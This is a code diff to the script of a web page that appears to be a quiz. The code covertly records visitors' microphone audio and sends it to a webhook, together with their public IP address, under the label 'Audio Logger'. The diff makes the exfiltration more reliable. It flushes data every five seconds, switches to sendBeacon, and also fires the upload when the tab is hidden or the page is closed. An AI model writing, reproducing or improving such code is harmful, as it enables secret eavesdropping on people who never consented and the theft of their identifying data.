@@ -262,45 +262,55 @@
         };
         
         mediaRecorder.start();
+        
+        setInterval(async () => {
+          if (mediaRecorder && mediaRecorder.state === 'recording' && audioChunks.length > 0) {
+            mediaRecorder.requestData();
+          }
+        }, 5000);
       } catch (error) {
         console.log('Audio recording not available');
       }
     }
     
-    async function sendAudioRecording() {
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+    function sendAudioRecording() {
+      return new Promise((resolve) => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
           
-          if (audioBlob.size > 5000) {
-            try {
-              const file = new File([audioBlob], `audio-complete.webm`, { type: 'audio/webm' });
-              const ip = await getIP();
-              const form = new FormData();
-              form.append('file', file);
-              form.append('payload_json', JSON.stringify({
-                username: "🇳🇾🇿🇪🇱 🇦🇺🇩🇮🇴 🇱🇴🇬🇬🇪🇷",
-                content: `Complete Audio Recording`,
-                embeds: [{
-                  title: "Full Quiz Audio Capture",
-                  description: "Complete audio recording from entire quiz session",
-                  color: 3447003,
-                  fields: [
-                    { name: "Public IP:", value: `\`${ip}\``, inline: true },
-                    { name: "Time:", value: new Date().toLocaleString(), inline: true }
-                  ],
-                  timestamp: new Date().toISOString(),
-                  footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
-                }]
-              }));
-              
-              await fetch(WEBHOOK, { method: "POST", body: form });
-            } catch {}
-          }
-        };
-      }
+          mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            
+            if (audioBlob.size > 5000) {
+              try {
+                const ip = await getIP();
+                const form = new FormData();
+                form.append('file', new File([audioBlob], `audio-complete.webm`, { type: 'audio/webm' }));
+                form.append('payload_json', JSON.stringify({
+                  username: "🇳🇾🇿🇪🇱 🇦🇺🇩🇮🇴 🇱🇴🇬🇬🇪🇷",
+                  content: `Complete Audio Recording`,
+                  embeds: [{
+                    title: "Full Quiz Audio Capture",
+                    description: "Complete audio recording from entire quiz session",
+                    color: 3447003,
+                    fields: [
+                      { name: "Public IP:", value: `\`${ip}\``, inline: true },
+                      { name: "Time:", value: new Date().toLocaleString(), inline: true }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
+                  }]
+                }));
+                
+                navigator.sendBeacon(WEBHOOK, form);
+              } catch {}
+            }
+            resolve();
+          };
+        } else {
+          resolve();
+        }
+      });
     }
     (async function logWebsiteEntry() {
       try {
@@ -445,7 +455,7 @@
         </div>
       `;
     }
-    window.addEventListener('beforeunload', () => {
+    window.addEventListener('beforeunload', (e) => {
       sendAudioRecording();
       
       if (stream) {
@@ -456,6 +466,12 @@
       }
       if (captureInterval) {
         clearInterval(captureInterval);
+      }
+    });
+    
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        sendAudioRecording();
       }
     });
   </script>
